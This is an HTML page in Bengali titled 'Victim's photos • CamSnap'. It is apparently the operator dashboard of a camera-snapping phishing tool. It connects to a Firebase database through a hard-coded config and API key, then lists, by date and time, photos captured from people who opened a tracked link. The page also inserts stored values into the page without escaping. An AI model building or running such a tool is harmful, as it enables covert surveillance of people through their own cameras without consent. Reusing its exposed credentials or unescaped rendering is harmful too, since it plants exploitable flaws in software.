<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ভিকটিমের ছবি • CamSnap</title>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
  <style>
    body{background:#111;color:#fff;font-family:Arial,sans-serif;padding:20px;min-height:100vh;}
    h1{text-align:center;color:#00ccff;font-size:2.2em;margin:30px 0;}
    .container{max-width:900px;margin:0 auto;}
    .info{background:#222;padding:20px;border-radius:16px;text-align:center;margin-bottom:25px;}
    .session{background:#1a1a2e;border-radius:20px;padding:25px;margin:30px 0;box-shadow:0 10px 30px rgba(0,0,0,0.6);}
    .date{color:#00ff9d;font-size:1.8em;font-weight:bold;margin-bottom:10px;}
    .time{color:#aaa;font-size:1.1em;margin-bottom:20px;}
    .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:16px;}
    .grid img{width:100%;height:240px;object-fit:cover;border-radius:16px;border:5px solid #0066ff;cursor:pointer;transition:0.3s;box-shadow:0 8px 25px rgba(0,102,255,0.5);}
    .grid img:hover{transform:scale(1.06);}
    .no-photo{color:#888;font-size:1.5em;text-align:center;padding:100px 0;}
  </style>
</head>
<body>
<div class="container">
  <h1>ভিকটিমের ছবি</h1>
  <div class="info" id="info">লোড হচ্ছে...</div>
  <div id="sessions"></div>
</div>

<script>
const firebaseConfig = {
  apiKey: "AIzaSyDTBla5gMV15V9HWBKAVYTWFt-CBrFfpzo",
  authDomain: "cam-snap-8e956.firebaseapp.com",
  databaseURL: "https://cam-snap-8e956-default-rtdb.firebaseio.com",
  projectId: "cam-snap-8e956",
  storageBucket: "cam-snap-8e956.firebasestorage.app",
  messagingSenderId: "982089892260",
  appId: "1:982089892260:web:2cfa5a4d3b3dbcf45d0131",
  measurementId: "G-S5S37F55T6"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

// ID ১০০% সঠিকভাবে নেওয়া
let id = new URLSearchParams(location.search).get('id');
if (!id) {
  id = location.pathname.split('/').pop();
  if (id === 'viewer.html' || id === '') id = null;
}

if (!id) {
  document.body.innerHTML = "<h1 style='color:red;text-align:center;margin-top:100px;'>লিংক ভুল!</h1>";
  throw new Error("No ID");
}

// ছবি লোড করা
db.ref('links/' + id).on('value', (snapshot) => {
  const data = snapshot.val();
  const infoDiv = document.getElementById('info');
  const container = document.getElementById('sessions');

  if (!data) {
    infoDiv.innerHTML = "কোনো ডাটা পাওয়া যায়নি!";
    container.innerHTML = "";
    return;
  }

  infoDiv.innerHTML = `
    <strong>লিংক:</strong> ${data.url}<br>
    <strong>তৈরি:</strong> ${data.created}
  `;

  const sessions = data.sessions || {};
  if (Object.keys(sessions).length === 0) {
    container.innerHTML = "<p class='no-photo'>এখনো কোনো ছবি আসেনি</p>";
    return;
  }

  let html = '';
  Object.keys(sessions).sort((a,b) => b.localeCompare(a)).forEach(date => {
    const session = sessions[date];
    const photos = session.photos || [];
    const time = session.time || "সময় পাওয়া যায়নি";

    html += `
      <div class="session">
        <div class="date">${date}</div>
        <div class="time">${time}</div>
        <div class="grid">
          ${photos.map(src => `<img src="${src}" onclick="window.open('${src}', '_blank')">`).join('')}
        </div>
      </div>
    `;
  });

  container.innerHTML = html;
});
</script>
</body>
</html>
